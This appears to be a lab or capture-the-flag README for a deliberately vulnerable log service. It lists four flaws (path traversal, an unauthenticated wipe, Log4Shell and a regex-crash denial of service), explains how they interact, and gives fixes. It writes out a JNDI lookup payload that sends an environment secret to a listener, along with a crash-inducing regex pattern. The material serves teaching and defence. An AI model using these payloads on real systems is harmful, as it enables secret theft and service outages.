# LOG - complete vulnerability list & PoCs

All four PoCs below target the intentionally-vulnerable Log Aggregation Module
(the spacecraft's flight recorder). Bring the service up first, then run each
script against it.

**Recommended: run everything in Docker** so the vulnerable service never
touches your host:

```
# builds LOG, waits for it, runs PoC #1 (path traversal) against the log container:
docker compose -f vuln_tests/docker-compose.yml run --build --rm poc

# run a different PoC (service already built) against the log container:
docker compose -f vuln_tests/docker-compose.yml run --rm \
    poc python3 03_lookup_injection.py log 8080
```

Or point a script at an already-running LOG directly:

```
python3 vuln_tests/01_path_traversal.py [host] [port]     # defaults 127.0.0.1 8080
```

Each script prints what it did and whether it succeeded (`[+]` success,
`[-]` failure). #3 stands up a short-lived local TCP/LDAP listener to catch the
Log4Shell JNDI callback and answers the anonymous BIND so the JDK proceeds to a
searchRequest whose DN is a nested `${env:LOG_FLAG_VALUE}` lookup - i.e. the
callback carries the minted flag out, which is the scored disclosure; #4 fires a
single crafted search and confirms a live-before / dead-after crash - see their
individual notes.

## The list

| # | Vulnerability | Location (function/method) | PoC |
|---|---|---|---|
| 1 | Path-traversal log download -> flag disclosure | `Main.routes` — `GET -> "logs" /: rest` (`Config.logsRoot.resolve(name)`) | `01_path_traversal.py` |
| 2 | Unauthenticated log wipe (damage / anti-forensics) | `Main.routes` — `DELETE -> "logs" /: rest` (token read into `_`, never checked) | `02_unauth_wipe.py` |
| 3 | Log4Shell — CVE-2021-44228 (pinned `log4j-core` 2.14.1) | `Store.append` -> `logger.info(message)`; the CVE is in the dependency, **not** the source | `03_lookup_injection.py` |
| 4 | Search ReDoS -> one-shot process crash (DoS) | `Search.run` (`q.r` regex over every line) | `04_search_redos.py` |

## Notes on how these interact

- **#1 and #2 are two halves of the same route family.** Both `GET` and
  `DELETE` on `/logs/{name}` reconstruct the name from the raw path with no
  containment and no authorization. #1 is confidentiality (read the flag), #2 is
  integrity/availability (destroy logs — a real shared-state DoS: it wipes the
  logs every caller depends on, with no isolation between attacker and victim,
  not just the attacker's own connection). A `..`-containment fix on the path
  does not add the missing authorization, and adding the token check does not
  stop the traversal - they are independent fixes on the same surface.
- **#3 is a REAL supply-chain CVE, not IPM's-style code bug.** The Log4Shell
  vulnerability lives in the *pinned dependency* `log4j-core` 2.14.1 (`build.sbt`),
  exactly like IPM's #10 (CVE-2022-44268) lives in the pinned ImageMagick build.
  You can audit every line of `Main.scala` clean and still ship it, because the
  evaluator is log4j's own message-lookup feature (`${jndi:...}` etc.), on by
  default before 2.15.0. The fix is a dependency bump, not a source edit -
  the SBOM / component-CVE lesson. Note the storage layer already writes the
  message VERBATIM to disk (so the `${env:...}` substitution never lands in
  searchable storage); the vulnerable sink is the `logger.info(message)` call,
  and the JNDI callback is the only channel that observes log4j's evaluation -
  which is exactly why the PoC exfiltrates the minted `LOG_FLAG_VALUE` through
  a nested `${jndi:ldap://<listener>/${env:LOG_FLAG_VALUE}}` lookup rather than
  reading it back off disk.
- **#4 is a pure-availability bug that manifests as a full-service crash.** It
  needs no secret and steals nothing; a single crafted `/search` takes the whole
  service down. `q` is compiled to a `java.util.regex` (`q.r`), whose matcher is
  recursive: a nested quantifier/alternation (`(a|a)+`) over a long ingested line
  descends one stack frame per character and throws a `StackOverflowError` at a
  few tens of thousands deep. Because that is a fatal `VirtualMachineError` (not
  `NonFatal`), Cats Effect does not down-convert it to a 500 - its runtime treats
  fatal errors as unrecoverable and exits the JVM - and ota-agent.sh only
  respawns on an OTA update, so the process stays dead. This is the LOG analogue
  of DNSM #1/#2 (a single request/packet crashes the process, no respawn) and of
  IPM #7 (a JVM resource abuse the runtime turns into a process exit rather than
  a caught error). Confirmation is by BYSTANDER liveness, never the attacking
  request's own fate: `/health` answers before, and is dead after and stays dead.
  It shares the `/search` surface with the normal functional query path - the fix
  has to keep plain-substring search working while removing the untrusted-regex
  compilation.

## Fix directions (brief - save the detail for when they ask)

All four are patchable **without breaking the functional harness check** (the
unit tests in `../unit_tests/` only exercise intended behaviour and already send
the operator token on wipe):

1. **Path traversal:** canonicalise the resolved path
   (`resolve(name).normalize().toRealPath()` or `.toFile.getCanonicalFile`) and
   reject anything that does not start with the canonical logs root; also reject
   names containing `..`, `/` or an absolute prefix. Normal single-file
   downloads (`nav.log`) still work.
2. **Unauthenticated wipe:** enforce the operator token — compare a constant-time
   hash of the `X-Operator-Token` header against `Config.opToken` and return
   `401`/`403` when it is missing or wrong. The harness (and the unit test)
   already supply `LOG_OP_TOKEN`, so authorized wipes keep working.
3. **Log4Shell (CVE-2021-44228, supply chain):** upgrade the pinned
   `log4j-core`/`log4j-api` in `build.sbt` to a fixed release (>= `2.17.1`) -
   the real fix. Defence-in-depth for the pinned version: set
   `-Dlog4j2.formatMsgNoLookups=true` (or `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`),
   remove the `JndiLookup` class from the jar, and stop passing untrusted input
   as the log message/pattern. Process-wise: generate an SBOM and scan
   dependencies against a CVE feed so an outdated `log4j-core` is caught before
   it ships - not by a student in the lab.
4. **Search ReDoS (crash):** do not compile untrusted input into a regex. Use a
   linear substring match (`line.contains(q)`) - which still satisfies the
   plain-word functional search - or, if regex is required, cap the query/line
   length and use a non-backtracking engine (e.g. RE2/`java.util.regex` with a
   hard step/time budget) so no input can drive the matcher into unbounded
   recursion. Defence-in-depth: don't let a single fatal error take the JVM with
   it - keep matching off the request path or bound its stack - but the real fix
   is not handing attacker input to a recursive backtracking engine.
